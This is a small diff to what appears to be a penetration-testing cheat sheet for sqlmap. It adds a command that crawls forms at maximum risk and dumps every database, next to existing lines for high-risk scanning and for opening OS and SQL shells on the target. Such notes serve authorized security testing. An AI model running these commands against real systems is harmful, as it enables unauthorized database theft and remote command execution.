@@ -6,6 +6,9 @@ sqlmap -u <url> --level 5 --risk 3
 # Use Burp request file
 sqlmap -r <file.req> --batch
 
+# Complex command
+sqlmap -u <url> --forms --crawl=2 --risk=3 --dbms=mysql --dbs --columns -D "<DB>" --dump-all
+
 # Get Shell
 sqlmap -u <url> --batch --banner --os-shell --sql-shell
 
